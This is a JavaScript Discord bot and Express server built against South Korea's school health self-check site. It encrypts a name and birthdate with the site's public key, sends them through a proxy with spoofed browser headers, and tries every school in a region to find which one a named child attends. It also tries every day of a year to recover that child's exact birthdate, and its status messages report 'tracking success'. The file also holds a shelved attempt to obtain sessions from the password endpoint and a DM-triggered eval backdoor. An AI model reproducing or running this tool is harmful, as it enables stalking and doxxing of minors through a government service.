const { Client, Intents, Collection, MessageEmbed, CommandInteraction } = require("discord.js");
const client = new Client({
    "fetchAllMembers": true,
    "partials": ["CHANNEL", "GUILD_MEMBER", "MESSAGE", "REACTION", "USER"],
    "intents": [
        Intents.FLAGS.DIRECT_MESSAGES,
        Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
        Intents.FLAGS.DIRECT_MESSAGE_TYPING,
        Intents.FLAGS.GUILDS,
        Intents.FLAGS.GUILD_BANS,
        Intents.FLAGS.GUILD_INTEGRATIONS,
        Intents.FLAGS.GUILD_INVITES,
        Intents.FLAGS.GUILD_MEMBERS,
        Intents.FLAGS.GUILD_MESSAGES,
        Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
        Intents.FLAGS.GUILD_MESSAGE_TYPING,
        Intents.FLAGS.GUILD_PRESENCES,
        Intents.FLAGS.GUILD_VOICE_STATES,
        Intents.FLAGS.GUILD_WEBHOOKS
    ]
});
process.on("beforeExit", exit);
process.on('SIGINT', exit);
const crypto = require('crypto');
const publicKey = `
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCnCKt0NVH7j5Oh2+SGgEU0aqi5u6
sYXemouJWXOlZO3jqDsHYM1qfEjVvCOmeoMNFXYSXdNhflU7mjWP8jWUmkYIQ8o3FGqMzsMTNxr
+bAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33Hmn7yDzcfjfBs99K5xJEppHG0
qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzhwUC8T4G5NclLEWzOQExbQ4oDlZBv
8BM/WxxuOyu0I8bDUDdutJOfREYRZBlazFHvRKNNQQD2qDfjRz484uFs7b5nykjaMB9k/EJAuHj
JzGs9MMMWtQIDAQAB
-----END PUBLIC KEY-----
`.trim();
const { default: axios } = require("axios-https-proxy-fix");
global.config = require('./config.json');
let proxy = !!config.proxy.host && config.proxy.port ? config.proxy : false;
const fs = require("fs");
const express = require("express");
const app = express();
global.schools = JSON.parse(fs.readFileSync("./schools.json", "utf8"));
global.using = [];
let codes = {
    "서울특별시": "sen",
    "부산광역시": "pen",
    "대구광역시": "dge",
    "인천광역시": "ice",
    "광주광역시": "gen",
    "대전광역시": "dje",
    "울산광역시": "use",
    "세종특별자치시": "sje",
    "경기도": "goe",
    "강원도": "kwe",
    "충청북도": "cbe",
    "충청남도": "cne",
    "전라북도": "jbe",
    "전라남도": "jne",
    "경상북도": "gbe",
    "경상남도": "gne",
    "제주특별자치도": "jje"
};
let headers = {
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.104 Whale/3.13.131.36 Safari/537.36",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Origin": "https://hcs.eduro.go.kr",
    "Referer": "https://hcs.eduro.go.kr/",
};
global.using = [];
app.listen(6975, () => console.info("[Server] Listening on port 6975"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.all("*", (req, res, next) => {
    req.ipAddress = req.ip.replace(/[^0-9.]/g, "");
    var now = new Date();
    var time = `[${now.getDate()}/${["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"][now.getMonth()]}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}]`;
    console.log(req.ipAddress, "- - " + time, '"' + req.method, req.path + '"');
    next();
});
app.post("/getSchool", async (req, res) => {
    let startedTime = Date.now();
    try {
        if (!config.allowedIps.includes(req.ipAddress)) throw new Error(`403|해당 IP(${req.ipAddress})는 접근 가능한 아이피가 아닙니다.`);
        if (using.includes(req.ipAddress)) throw new Error(`400|해당 IP의 요청이 이미 진행중입니다.`);
        let { name, birthday, region, special } = req.body;
        using.push(req.ipAddress);
        let result = await findSchool(name, birthday, region, special);
        using.remove(req.ipAddress);
        if (!result.success) throw new Error(`400|${school.message}`);
        if (!result.schools.length > 1) throw new Error("400|정보를 다시 확인해 주세요.");
        res.json({
            success: true,
            messsage: "success",
            data: result.schools,
            t: Date.now() - startedTime
        });
    } catch (e) {
        using.remove(req.ipAddress);
        res.status(parseInt(e.message.split("|")[0]) || 500).json({
            success: false,
            message: e.message.split("|")[1] || e.message,
            t: Date.now() - startedTime
        });
    };
});

global.findSchool = findSchool;
/**
 * 
 * @param {array} orgList 
 * @param {string} name 
 * @param {string} birthday 
 * @param {string} region 
 * @param {boolean} special 
 * @param {CommandInteraction} interaction 
 * @returns {Promise<{ success: boolean, message: string, schools: array }>}
 */
async function findSchool(name, birthday, region, special = false, interaction = null) {
    let searchKeyInterval;
    let s = [];
    let startedTime = Date.now();
    try {
        if ((!name || name.length < 2 || name.length > 4 || /[^가-힣]/.test(name) || config.blockedNames.includes(name))) throw new Error("이름을 다시 확인해 주세요.");
        if (!birthday || birthday.length !== 6 || /[^0-9]/.test(birthday)) throw new Error("생년월일을 다시 확인해 주세요.");
        birthday = [birthday.substring(0, 2), birthday.substring(2, 4), birthday.substring(4, 6)];
        if (Number(birthday[0]) < 04 || Number(birthday[0]) > 15) throw new Error("생년월일을 다시 확인해 주세요.");
        let orgList = schools.filter(x => x.level == (special ? "특수" : Number(birthday[0]) <= 15 && Number(birthday[0]) >= 10 ? "초" : Number(birthday[0]) <= 09 && Number(birthday[0]) >= 07 ? "중" : "고"))
        // orgList = !!region ? Object.keys(orgList).filter(x => orgList[x].region == region) : Object.keys(orgList);
        orgList = !!region ? orgList.filter(x => x.region == region) : orgList;
        let description = "";
        orgList = orgList.reduce((all, one, i) => {
            const ch = Math.floor(i / 200);
            all[ch] = [].concat((all[ch] || []), one);
            return all
        }, []); //chunk
        let currentPage = 0;
        let searchKey = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EB%B3%B4%EC%95%88%EC%A2%86%EB%B3%91%EC%8B%A0&orgName=%ED%95%99&loginType=school", { proxy, headers, timeout: 5000 }).then(res => res.data.key).catch(e => "");
        if (!searchKey) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
        searchKeyInterval = setInterval(async () => {
            let res = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EB%B3%B4%EC%95%88%EC%A2%86%EB%B3%91%EC%8B%A0&orgName=%ED%95%99&loginType=school", { proxy, headers, timeout: 5000 }).then(res => res.data.key).catch(e => "");
            if (!!res) searchKey = res;
        }, 90000); // hcs 서치 키 만료 시간: 2분
        for (chunk of orgList) {
            currentPage++;
            if (interaction) {
                if (s.length >= 1) interaction.editReply({ embeds: [new MessageEmbed().setColor("GREEN").setTitle(`✅ 트래킹 성공 (페이지 ${currentPage}/${orgList.length})`).setDescription(description)] });
                else interaction.editReply({ embeds: [new MessageEmbed().setColor("BLUE").setTitle(`🔍 검색 중... (페이지 ${currentPage}/${orgList.length})`)] });
            };
            await Promise.all(chunk.map(async (org) => {
                // org = {
                //     name: schools[schoolLevel][org].name,
                //     region: schools[schoolLevel][org].region,
                //     code: org
                // };
                let result = await axios.post(`https://${codes[org.region]}hcs.eduro.go.kr/v2/findUser`, {
                    "orgCode": org.code,
                    "name": encrypt(name),
                    "birthday": encrypt(birthday.join("")),
                    "stdntPNo": null,
                    "loginType": "school",
                    searchKey
                }, { proxy, headers, timeout: 10000 }).catch(err => { return err.response ? err.response : { status: "error", err } });
                // result.status == "error" && console.log(result.err);
                result = result && result.data;
                if (!!result && !!result.orgName) {
                    result.orgCode = org.code;
                    result.scCode = codes[org.region];
                    result.region = org.region;
                    result.birthday = {
                        text: `${Number(birthday[0]) + 2000}년 ${birthday[1]}월 ${birthday[2]}일`,
                        year: Number(birthday[0]) + 2000,
                        month: birthday[1],
                        day: birthday[2]
                    };
                    s.push(result);
                    interaction && interaction.editReply({ embeds: [new MessageEmbed().setColor("GREEN").setTitle(`✅ 트래킹 성공 (페이지 ${currentPage}/${orgList.length})`).setDescription(description += `\n**\`${result.region} ${result.orgName}\`**에서 **\`${name}\`**님의 정보를 찾았습니다! (소요된 시간: ${((Date.now() - startedTime) / 1000).toFixed(3)}초)`)] });
                };
            }));
        };
        return {
            success: true,
            message: `해당 정보로 총 ${s.length}개의 학교를 찾았습니다.`,
            schools: s
        };
    } catch (e) {
        return {
            success: false,
            message: e.message,
            schools: s
        };
    } finally {
        clearInterval(searchKeyInterval);
    };
};

Array.prototype.remove = function (element) {
    var index = this.indexOf(element);
    if (index > -1) this.splice(index, 1);
};

client.commands = new Collection();

client.on("ready", () => {
    try { !!config.onOffMessageCh && client.channels.cache.get(config.onOffMessageCh).send(`[${new Date().toLocaleString("ko-kr")}] 봇 켜짐.`); } catch { };
    console.info(`[BOT] ${client.user.tag} is online!`);
    require("./handler")(client);
});

client.on("messageCreate", async message => {
    if (config.owners.includes(message.author.id) && message.content.startsWith("!eval ") && message.channel.type === "DM") {
        try {
            let e = eval(message.content.slice(6));
            message.reply({ embeds: [new MessageEmbed().setTitle(`✅ Success`).setDescription(`\`\`\`xl\n${e}\`\`\``).setColor("GREEN").setTimestamp()] });
        } catch (e) {
            message.reply({ embeds: [new MessageEmbed().setTitle(`❌ Failed`).setDescription(`\`\`\`xl\n${e}\`\`\``).setColor("RED").setTimestamp()] });
        };
    };
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;
    const command = client.commands.get(interaction.commandName);
    if (!command) return interaction.reply({ content: `Command \`${interaction.commandName}\` not found.`, ephemeral: true });
    try {
        if (!config.owners.includes(interaction.user.id) && !config.allowedUsers.includes(interaction.user.id)) return interaction.reply({ embeds: [new MessageEmbed().setTitle("❌ Missing Permission").setDescription("You don't have permission to use this command.").setColor("RED")], ephemeral: true });
        await command.execute(interaction, client);
    } catch (error) {
        console.error(error);
        await interaction[interaction.replied ? "editReply" : "reply"]({ content: 'There was an error while executing this command!', ephemeral: true });
    };
});

async function sendValidatePassword(token, code) { //잠시 보류
    try {
        if (!token || !code) throw new Error("잘못됨.");
        // let initTime = crypto.createHash('md5').update(Date.now().toString()).digest('hex'); //initTime은 abcdef1234567890로만 이루어져 있고, 32자 여야 함. (그냥 MD5로 암호화하면 됨. 값은 상관 X)
        // let transkeyUuid = crypto.randomBytes(128).toString("hex"); //transkeyUuid는 아무 값이나 입력해도 됨. 글자 수 제한 X. 문자 제한 X
        let headers = {
            "Connection": "keep-alive",
            "Authorization": "Bearer " + token,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.104 Whale/3.13.131.36 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://hcs.eduro.go.kr",
            "Referer": "https://hcs.eduro.go.kr/",
        };
        let keyIndex = await axios.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`, { proxy, headers }).then(res => res.data);
        headers["Content-Type"] = "application/json;charset=UTF-8";
        let res = await axios.post(`https://${code}hcs.eduro.go.kr/v2/validatePassword`, { "password": `{"raon":[{"id":"password","enc":"","hmac":"","keyboardType":"number","keyIndex":"${keyIndex}","fieldType":"password","seedKey":"","initTime":"${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}","ExE2E":"false"}]}`, "deviceUuid": "", "makeSession": true }, { proxy, headers });
        //initTime이 다르면 되고, 같으면 안되네..?ㅋㅋㅋㅋ
        return res.data;
    } catch {
        return false;
    };
};

global.getBirthdate = getBirthdate;
async function getBirthdate(name, birthYear, school, interaction = null) {
    let searchKeyInterval;
    let data = [];
    try {
        if ((!name || name.length < 2 || name.length > 4 || /[^가-힣]/.test(name) || config.blockedNames.includes(name))) throw new Error("이름을 다시 확인해 주세요");
        if (Number(birthYear) < 04 || Number(birthYear) > 15) throw new Error("출생연도를 다시 확인해 주세요");
        let schoolList = schools.filter(x => (x.level == (Number(birthYear) <= 15 && Number(birthYear) >= 10 ? "초" : Number(birthYear) <= 09 && Number(birthYear) >= 07 ? "중" : "고") || x.level == "특수") && x.code == school);
        birthYear = birthYear.length <= 1 ? `0${birthYear}` : birthYear;
        if (schoolList.length < 1) throw new Error("학교를 다시 확인해 주세요");
        school = schoolList[0];
        let searchKey = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EB%B3%B4%EC%95%88%EC%A2%86%EB%B3%91%EC%8B%A0&orgName=%ED%95%99&loginType=school", { proxy, headers, timeout: 5000 }).then(res => res.data.key).catch(e => "");
        if (!searchKey) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
        searchKeyInterval = setInterval(async () => {
            let res = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EB%B3%B4%EC%95%88%EC%A2%86%EB%B3%91%EC%8B%A0&orgName=%ED%95%99&loginType=school", { proxy, headers, timeout: 5000 }).then(res => res.data.key).catch(e => "");
            if (!!res) searchKey = res;
        }, 90000); // hcs 서치 키 만료 시간: 2분
        let description = "";
        let startedTime = Date.now();
        const monthDays = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
        let currentPage = 0;
        for (let month = 0; month < monthDays.length; month++) {
            let array = new Array(monthDays[month]).fill(0, 0, monthDays[month]);
            for (let j = 0; j < monthDays[month]; j++) array[j] = j + 1;
            currentPage++;
            if (interaction) {
                if (data.length >= 1) interaction.editReply({ embeds: [new MessageEmbed().setColor("GREEN").setTitle(`✅ 성공 (페이지 ${currentPage}/${monthDays.length})`).setDescription(description)] });
                else interaction.editReply({ embeds: [new MessageEmbed().setColor("BLUE").setTitle(`🔍 검색 중... (페이지 ${currentPage}/${monthDays.length})`)] });
            };
            await Promise.all(array.map(async day => {
                let result = await axios.post(`https://${codes[school.region]}hcs.eduro.go.kr/v2/findUser`, {
                    "orgCode": school.code,
                    "name": encrypt(name),
                    "birthday": encrypt(`${birthYear}${month < 9 ? "0" : ""}${month + 1}${day < 10 ? "0" : ""}${day}`),
                    "stdntPNo": null,
                    "loginType": "school",
                    searchKey
                }, { proxy, headers, timeout: 10000 }).catch(err => { return err.response ? err.response : { status: "error", err } });
                // result.status == "error" && console.log(result.err);
                result = result && result.data;
                if (!!result && !!result.orgName) {
                    result.birthday = {
                        text: `${Number(birthYear) + 2000}년 ${month + 1}월 ${day}일`,
                        year: Number(birthYear) + 2000,
                        month: month + 1,
                        day: day
                    };
                    data.push(result);
                    interaction && interaction.editReply({ embeds: [new MessageEmbed().setColor("GREEN").setTitle(`✅ 성공 (페이지 ${currentPage}/${monthDays.length})`).setDescription(description += `\n**\`${birthYear}년 ${month + 1}월 ${day}일\`** (소요된 시간: ${((Date.now() - startedTime) / 1000).toFixed(3)}초)`)] });
                };
            }));
        };
        if (!data.length > 1) throw new Error("정보를 찾을 수 없습니다.");
        return { success: true, data };
    } catch (e) {
        return { success: false, message: e.message, data };
    } finally {
        clearInterval(searchKeyInterval);
    };
};

function encrypt(text) {
    return crypto.publicEncrypt({ 'key': Buffer.from(publicKey, 'utf-8'), 'padding': crypto.constants.RSA_PKCS1_PADDING }, Buffer.from(text, 'utf-8')).toString('base64')
};

async function exit() {
    try { !!config.onOffMessageCh && await client.channels.cache.get(config.onOffMessageCh).send(`[${new Date().toLocaleString("ko-kr")}] 봇 꺼짐.`); } catch { };
    process.exit(0);
};

client.login(config.token);